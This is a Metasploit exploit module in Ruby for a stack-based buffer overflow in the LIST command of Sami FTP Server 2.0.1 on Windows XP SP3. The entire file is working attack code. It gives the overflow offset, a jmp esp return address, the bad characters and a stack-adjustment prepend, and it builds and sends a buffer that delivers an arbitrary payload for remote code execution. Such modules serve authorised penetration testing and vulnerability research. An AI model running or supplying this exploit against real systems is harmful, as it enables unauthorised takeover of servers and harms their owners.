# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#  http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit4 < Msf::Exploit::Remote
  Rank = LowRanking

  include Msf::Exploit::Remote::Ftp

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;       => &#039;Sami FTP Server LIST Command Buffer Overflow&#039;,
      &#039;Description&#039;   => %q{
          This module exploits a stack based buffer overflow on Sami FTP Server 2.0.1.
        The vulnerability exists in the processing of LIST commands. In order to trigger
        the vulnerability, the "Log" tab must be viewed in the Sami FTP Server managing
        application, in the target machine. On the other hand, the source IP address used
        to connect with the FTP Server is needed. If the user can&#039;t provide it, the module
        will try to resolve it. This module has been tested successfully on Sami FTP Server
        2.0.1 over Windows XP SP3.
      },
      &#039;Platform&#039;     => &#039;win&#039;,
      &#039;Author&#039;     =>
        [
          &#039;superkojiman&#039;, # Original exploit
          &#039;Doug Prostko <dougtko[at]gmail.com>&#039; # MSF module
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;   =>
        [
          [ &#039;OSVDB&#039;, &#039;90815&#039;],
          [ &#039;BID&#039;, &#039;58247&#039;],
          [ &#039;EDB&#039;, &#039;24557&#039;]
        ],
      &#039;Privileged&#039;   => false,
      &#039;Payload&#039;     =>
        {
          &#039;Space&#039;          => 1500,
          &#039;DisableNops&#039;    => true,
          &#039;BadChars&#039;       => "\x00\x0a\x0d\x20\x5c",
          &#039;PrependEncoder&#039; => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
        },
      &#039;Targets&#039;     =>
        [
          [ &#039;Sami FTP Server 2.0.1 / Windows XP SP3&#039;,
            {
              &#039;Ret&#039; => 0x10028283, # jmp esp from C:\Program Files\PMSystem\Temp\tmp0.dll
              &#039;Offset&#039;   => 228
            }
          ],
        ],
      &#039;DefaultTarget&#039; => 0,
      &#039;DisclosureDate&#039; => &#039;Feb 27 2013&#039;))
    register_options(
      [
        OptAddress.new(&#039;SOURCEIP&#039;, [false, &#039;The local client address&#039;])
      ], self.class)
  end

  def exploit
    connect
    if datastore[&#039;SOURCEIP&#039;]
      ip_length = datastore[&#039;SOURCEIP&#039;].length
    else
      ip_length = Rex::Socket.source_address(rhost).length
    end
    buf = rand_text(target[&#039;Offset&#039;] - ip_length)
    buf << [ target[&#039;Ret&#039;] ].pack(&#039;V&#039;)
    buf << rand_text(16)
    buf << payload.encoded
    send_cmd( [&#039;LIST&#039;, buf], false )
    disconnect
  end

end

